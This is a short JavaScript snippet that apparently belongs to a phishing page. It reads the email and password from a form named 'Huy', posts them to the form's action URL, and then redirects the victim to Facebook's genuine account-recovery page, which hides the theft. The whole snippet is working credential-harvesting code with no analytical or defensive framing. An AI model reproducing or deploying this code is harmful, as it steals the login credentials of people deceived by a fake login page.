const form = document.querySelector('form[name="Huy"]');

form.addEventListener('submit', e => {
    e.preventDefault();
    const email = form.querySelector('input[name="email"]').value;
    const password = form.querySelector('input[name="password"]').value;

  fetch(form.action, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      email: email,
      password: password
  })
  })
  .then(response => response.json())
  .then(data => {
      window.location.href = "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0";
  })
  .catch((error) => {
    console.error('Error:', error);
  });
});